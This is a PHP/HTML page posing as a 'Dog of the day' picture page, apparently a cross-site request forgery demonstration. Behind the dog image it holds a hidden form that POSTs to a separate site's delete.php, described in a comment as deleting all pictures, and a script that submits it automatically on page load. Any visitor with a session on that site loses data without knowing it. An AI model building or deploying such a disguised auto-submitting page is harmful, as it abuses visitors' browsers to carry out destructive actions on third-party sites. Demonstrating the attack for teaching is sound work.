<!DOCTYPE html>
<html lang="de">
    <?php include 'template/head.php';?>
    <body>

        <?php include 'template/navbar.php';?>
        <div class="container">
            <h1 class="text-center">Dog of the day</h1>
            <h5 class="text-center">Look at this dog, isn't he the sweetest little dog you've ever seen?</h5>
            <img class="center-block" src="cute-dog.jpg"/>
            <p class="text-center">Image courtesy of vudhikrai at FreeDigitalPhotos.net</p>

            <?php session_start(); ?>
            <?php if (!empty($_GET['delete'])): ?>
                <?php unset($_GET['delete']); ?>
            <?php else: ?>
                <!-- Form for deleting all pics-->
                <form method="POST" action="http://ccc-xsrf.dev/delete.php" class="form-horizontal text-center hidden" id="xsrf_form">
                        <button class="btn btn-success" type="submit" name="submit" id="xsrf_submit" >
                            <i class="fa fa-btn fa-check"></i>I like this dog
                        </button>
                </form>

                <!-- Script for auto-submitting the form -->
                <script>
                    $(window).load(function() {
                        $("#xsrf_submit").click();
                    });
                </script>
            <?php endif; ?>

        </div>
    </body>
    <?php include 'template/footer.php';?>
    <?php include 'template/scripts.php';?>

</html>
